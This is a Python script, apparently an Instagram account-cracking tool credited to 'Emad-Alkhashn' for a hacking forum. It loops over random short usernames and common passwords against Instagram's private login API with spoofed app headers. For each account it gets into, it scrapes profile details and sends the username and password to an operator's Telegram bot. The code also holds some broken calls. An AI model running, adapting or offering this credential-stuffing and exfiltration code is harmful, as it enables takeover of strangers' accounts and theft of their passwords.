from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pkg install php')
    os.system('php Browser_Requirements.php')
    os.system('clear')
    
    
    
####----[ الالوان ]----####

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
BJingga= "\x1b[38;5;208m" # Jingga
lo = 'o o'




####----[ قاعدة البيانات ]----####


lestpass = ["1q2w3e4r","1q2w3e4r5t","123456789123456789","abc123","qwer1234"]
admin = ("Emad")
pas = ("123456")
os.system("clear")
print("""       
"""+BJingga+""" 
  ______                           _ 
 |  ____|                         | |
 | |__     _ __ ___     __ _    __| |
 |  __|   | '_ ` _ \   / _` |  / _` |
 | |____  | | | | | | | (_| | | (_| |
 |______| |_| |_| |_|  \__,_|  \__,_|
 Emad-Alkhashn ™ v.1
 
                                     
═───────◇───────═
Whatsapp : +96170318652
Instagram : @di_1
version : v.1
programmer : Emad-alkhshn
Release Date : 1/5/2022
═───────◇───────═                    """)
print (lo*17)
print (" ")
u = input(" "+BWhite+"  Enter your Name :  ")
p = input(" "+BWhite+"  Enter your password :  ")

if u == admin and p == pas :
	os.system("clear")
	print("""
"""+BGreen+""" Welcome to admin
"""+BJingga+""" 
  ______                           _ 
 |  ____|                         | |
 | |__     _ __ ___     __ _    __| |
 |  __|   | '_ ` _ \   / _` |  / _` |
 | |____  | | | | | | | (_| | | (_| |
 |______| |_| |_| |_|  \__,_|  \__,_|
 Emad-Alkhashn ™ v.1
 
                                     
═───────◇───────═
Whatsapp : +96170318652
Instagram : @di_1
version : v.1
programmer : Emad-alkhshn
Release Date : 1/5/2022
═───────◇───────═                    """)


	
else:
	print(random.email)
	
print (BJingga+lo*17)
print (" ")
fock = (" "+BWhite+" Enter crack Name :  ")
porn = (" "+BWhite+" Enter crack Email :  ")
xnxx = (" "+BWhite+" Enter crack pass :  ")
myadmin = input(" "+BWhite+" Enter id :  ")
tele = input(" "+BWhite+" Enter token :  ")
print (" ")
print (BJingga+lo*17)
print (" ")
	
	
	



def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
𖣘  Al kullan ABEE
═───────◇───────═
❶➾ User : {user2}
❷➾ Name : {name}
❸➾ Pasw : {pasw} 
❹➾ Followers : {followes}
❺➾  Following : {following}
❻➾ Date : {datee}
 ═───────◇───────═
⊱ FOR  @TR_HACK_FORUM ⊰ """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars1 = ["passowrd","12341234","12345678","qwer1234","mark123","abc123","admin","100200300","10203040","12344321","11223344","king","instagram"]
    chars = '1q2w3e4r5t6y7_u8i9o0p1a2s3_d4f5g6h7j8k9l01z2x3c4_v5b6n7m890'
    u = fock
    u0 = porn
    u1 = xnxx
    u2 = str("". join(random.choice(chars)for i in range(3)))
    u3 = str("". join(random.choice(chars1)for i in range(1)))
    user = u2
    pasw = u3
    url = 'https://i.Instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 13.0.0.7.199 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-FB-Capabilities':'AQ==', 
         'X-FB-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BGreen+f"  ® Welcome  "+BGreen+" :"+BGreen+f" {user}  °  {pasw}                                                       ")
        requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
   
 • ──────────── •
    - | * | User : {user} 
    
    - | * | pass  : {pasw} 
 • ──────────── •
    سبحان الله """) 
    else:
        print(" "+BWhite+f"       "+BRed+" "+BRed+f" {user}  °   {pasw}                                                                       ")
    
